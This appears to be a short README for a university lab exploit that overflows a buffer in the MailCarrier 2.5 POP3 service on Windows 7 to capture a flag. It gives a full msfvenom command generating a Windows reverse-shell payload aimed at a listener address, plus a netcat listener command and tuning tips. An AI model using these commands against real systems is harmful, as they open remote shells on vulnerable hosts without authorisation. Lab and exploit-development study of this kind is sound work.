# Mailcarrier-2.5-buffer-overflow

This was part of a Universety project where we were tasked on using a buffer overflow to get a flag from a system, it exploited the vulnerabilities of the mailcarrier 2.5 server using the pop 3 port(110)

the program was running on a win7 machine, to use it run the command: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.4 LPORT=25 -b "\x00" exitfunc=thread -f python

where LHOST is your IP address and LPORT the port you will be listening on netcat, in this case, because the mailcarrier also open port 25 it was used

change the variable "shellcode" to the code generated by msfvenom

run: nc -nlvp 25

results may vary from system to system, if its not working i recommend you try top replicate the system on a local machine and figure it out if the JMP code, number of characters to reach EIP or Badchars differ from this case
